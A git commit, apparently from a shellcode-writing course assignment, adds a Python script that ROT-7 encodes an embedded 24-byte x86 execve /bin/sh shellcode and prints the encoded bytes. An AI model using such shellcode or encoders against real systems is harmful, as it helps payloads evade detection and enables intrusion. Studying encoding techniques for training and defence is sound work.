b4bb0370851512c8d4417ffcead74695eedb564c
adeptex <adeptex@users.noreply.github.com>
2015-06-29 00:08:34 +0200

    Create a6-rot7-encode.py

---
+++ Assignment-6/rot7/a6-rot7-encode.py
@@ -0,0 +1,33 @@
+#!/usr/bin/python
+
+# Python ROT-7 Encoder
+# execve 24 bytes
+shellcode = (
+    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
+    "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
+)
+
+encoded = "\\x%02x," % len(bytearray(shellcode))
+encoded2 = "0x%02x," % len(bytearray(shellcode)) 
+
+print 'Encoded shellcode ...'
+
+for x in bytearray(shellcode) :
+# boundary is computed as 255-ROT(x) where x, the amount to rotate by
+    if x > 248:
+        encoded += '\\x'
+        encoded += '%02x' %(7 -(256 - x))
+        encoded2 += '0x'
+        encoded2 += '%02x,' %(7 -(256 - x))
+    else:
+        encoded += '\\x'
+        encoded += '%02x'%(x+7)
+        encoded2 += '0x'
+        encoded2 += '%02x,' %(x+7)
+    
+
+print encoded
+
+print encoded2
+
+print 'Len: %d' % len(bytearray(shellcode))
